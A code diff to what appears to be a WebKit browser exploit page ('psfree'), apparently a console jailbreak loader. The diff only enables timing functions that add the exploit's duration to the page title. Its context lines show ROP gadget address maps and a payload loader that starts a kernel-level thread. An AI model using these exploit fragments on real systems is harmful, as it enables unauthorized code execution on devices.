@@ -34,9 +34,9 @@ var wk2_gadgetmap = {"mov [rax], rdi": 0xFFDD7,"mov [rax], rcx": 0x2C9ECA,"mov [
 var hmd_gadgetmap = {"add [r8], r12": 0x2BCE1};
 var ipmi_gadgetmap = {"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B};
 
-// function CalcTime(dur){hrs=Math.floor(dur/1000/60/60);min=Math.floor(dur/1000/60-hrs*60);sec=Math.floor(dur/1000-min*60);mil=dur.toString().slice(-3);if (min!=0){ShowDuration=" - Webkit Exploited In : "+min+" minute"+(min==1?"":"s")+", "+sec+" second"+(sec==1?"":"s");}else {ShowDuration=" - WK Exploited In: "+sec+" second"+(sec==1?"":"s");}}
-// function StartTimer(){StartTime=Date.now();}
-// function EndTimer(){EndTime=Date.now();CalcTime(EndTime=Date.now()-StartTime);top.document.title+=ShowDuration;}
+function CalcTime(dur){hrs=Math.floor(dur/1000/60/60);min=Math.floor(dur/1000/60-hrs*60);sec=Math.floor(dur/1000-min*60);mil=dur.toString().slice(-3);if (min!=0){ShowDuration=" - Webkit Exploited In : "+min+" minute"+(min==1?"":"s")+", "+sec+" second"+(sec==1?"":"s");}else {ShowDuration=" - WK Exploited In: "+sec+" second"+(sec==1?"":"s");}}
+function StartTimer(){StartTime=Date.now();}
+function EndTimer(){EndTime=Date.now();CalcTime(EndTime=Date.now()-StartTime);top.document.title+=ShowDuration;}
 function sleep(milliseconds){const date=Date.now();let currentDate=null;do{currentDate=Date.now();}while(currentDate-date<milliseconds);}
 
 function int64(low, hi) {
@@ -394,7 +394,7 @@ function userland() {
 
 // Webkit psfree by abc 
  async function webkitExploit() {
-//  StartTimer();
+  StartTimer();
  function die(msg) {
   alert(msg);
   undefinedFunction();
@@ -1334,7 +1334,7 @@ function userland() {
             return new int64(res.low(), res.high());
         }
     };
-// EndTimer();
+   EndTimer();
  window.p = prim;
  run_hax();
 }
@@ -1706,6 +1706,8 @@ function loadPayload(PLD){
    chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
    mymenu.contentWindow.PLdone();
 }
+
+
 /////////////////////////////////////////////////////////////////////////////////////////////////
 /////////////////////////////////////////////////////////////////////////////////////////////////
 /////////////////////////////////////////////////////////////////////////////////////////////////
